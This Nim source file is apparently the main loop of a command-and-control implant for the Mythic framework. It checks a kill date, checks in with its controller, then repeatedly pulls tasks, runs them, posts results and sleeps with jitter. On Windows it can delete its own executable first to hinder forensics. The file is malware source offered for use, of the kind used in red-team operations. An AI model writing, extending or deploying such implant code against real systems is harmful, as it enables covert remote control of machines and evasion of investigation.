import std/[times, random]
import config, agent

# Conditional imports for Windows-only features
when defined(windows):
  import utils/self_delete

# Main entry point
proc main() =
  # Initialize random number generator for jitter
  randomize()
  
  # Check killdate
  let cfg = getConfig()
  let now = now().format("yyyy-MM-dd")
  if now >= cfg.killdate:
    return
  
  # Initialize agent
  var agentInstance = newAgent()
  
  # Perform initial checkin
  if not agentInstance.checkin():
    return
  
  # Main agent loop
  while not agentInstance.shouldExit:
    # Get tasking from Mythic
    let tasks = agentInstance.getTasks()
    
    # Process tasks
    agentInstance.processTasks(tasks)
    
    # Send responses back (handles background task state machine)
    agentInstance.postResponses()
    
    # Sleep with jitter
    agentInstance.sleep()

when isMainModule:
  # Handle self-delete BEFORE main execution if enabled
  when defined(windows):
    let cfg = getConfig()
    if cfg.selfDelete:
      if cfg.debug:
        echo "[DEBUG] Executing self-delete"
      selfDelete()
  
  main()
